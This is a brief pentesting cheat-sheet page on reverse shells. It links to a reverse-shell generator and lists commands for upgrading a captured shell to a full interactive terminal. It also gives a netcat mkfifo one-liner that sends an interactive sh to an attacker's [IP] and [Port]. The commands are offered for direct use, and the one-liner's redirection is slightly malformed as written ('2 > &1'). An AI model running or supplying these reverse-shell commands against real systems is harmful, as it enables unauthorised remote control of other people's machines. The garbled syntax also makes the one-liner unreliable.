---
title: 'Reverse Shells'
description: ''
pubDate: 'Nov 28 2025'
---

Online: [Reverse-Shell Generator](https://www.revshells.com/)

## Upgrade a Shell

```
$v> python3 -c 'import pty; pty.spawn("/bin/bash")'
[STRG+Z] # sends shell to background
$a> stty raw -echo && fg
$a> export TERM=xterm
```

## Netcat (nc)

```
$v> which nc
$v> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2 > &1 | nc [IP] [Port] > /tmp/f
```

